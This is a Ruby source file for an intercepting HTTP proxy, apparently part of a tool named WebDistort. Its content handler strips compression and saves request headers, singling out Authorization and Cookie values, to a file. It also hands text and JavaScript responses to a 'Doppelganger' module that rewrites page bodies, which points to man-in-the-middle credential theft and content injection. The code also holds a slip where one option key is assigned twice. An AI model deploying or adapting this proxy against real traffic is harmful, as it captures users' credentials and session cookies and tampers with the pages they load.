#!/usr/bin/ruby

# define external libraries
require "rubygems"
require "dnsruby"
require "optparse"
require "socket"
require "webrick_override"
require "pp"
require "doppelganger"

class WebDistort
 
  class Proxy
    @server_ip = ''
    
    @proxy_port = ''
    
    @http_root = ''   
    @http_port = ''
    
    @header_file = nil
    @data_dir = Dir::pwd + '/saved'
    
    @options = nil

	@doppelganger = nil
        
    def initialize(o)
      @options = o
      
      @data_dir = @options['data_dir']
      @http_root = @options['http_root']
      @http_port = @options['http_port']
      @proxy_port = @options['proxy_port']
      @server_ip = @options['server_ip']		
      @grab_all_headers = @options['grab_headers']

	@doppelganger = Doppelganger.new(
		:HttpdAddr => @server_ip,
		:HttpdPort => @http_port,
		:ProxyAddr => @server_ip,
		:ProxyAddr => @proxy_port
	)
    end

	def doppelganger
		@doppelganger
	end
    
    def handle_contents(request, response)
	puts request.host;

      if response.content_type =~/text/ || response.content_type =~/javascript/
        if $header_file == nil
          $header_file = File.open(@data_dir + "/headers.txt", "a")
        end
        
        header_output = request.request_line
        request.raw_header.each {|line| header_output = header_output + line}
        header_output = header_output + "-"*70+"\n"
        
        if @grab_all_headers || header_output =~ /Authorization/ || header_output =~ /Cookie/
          count =  $header_file.syswrite(header_output);	
        end        
        return @doppelganger.ModifyBody(response.body)
      else
        return response.body
      end
    end
    
    
    def start()
      proxy_logger = WEBrick::Log.new(@data_dir + "/proxy.log")
      access_log_file = File.open(@data_dir + "/proxy_access.log", "a")
      access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
      
      
      proxy = WebDistortProxy.new(
                                           :Logger => proxy_logger,
                                           :AccessLog => access_logger,
                                           :Port => @proxy_port,
                                           :RequestCallback => Proc.new{|req,res|
																			        req.header.delete('accept-encoding') },
																						:ProxyContentHandler => lambda {|request, response|
																				        response.body = handle_contents(request, response)})
      


      proxy.start
    end
  end
end
